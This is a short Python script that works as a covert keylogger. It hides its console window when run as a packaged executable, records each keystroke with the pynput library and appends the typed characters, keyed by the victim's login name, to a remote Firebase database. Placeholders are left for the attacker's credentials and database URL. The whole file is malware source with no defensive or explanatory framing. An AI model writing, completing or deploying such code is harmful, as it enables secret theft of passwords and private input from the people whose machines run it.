import ctypes
import sys
import os

username = os.getlogin()

# Hide the console window if running as a PyInstaller executable
if getattr(sys, 'frozen', False):
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

import firebase_admin
from firebase_admin import db, credentials
import os

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

cred = credentials.Certificate(resource_path("add the firebase json credentials path in here"))
firebase_admin.initialize_app(cred, {
    "databaseURL": "{Insert FireBase Url here}"
})

ref = db.reference("/")
ref.update({(str)(username): "Started aProcess: "})

from pynput import keyboard

def keyPressed(key):
    print(str(key))
    try:
        char = key.char
        ref.update({(str)(username): ref.get()[(str)(username)] + char})
    except:
        x = 1  # Suppress non-character key errors
import threading

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    threading.Event().wait()
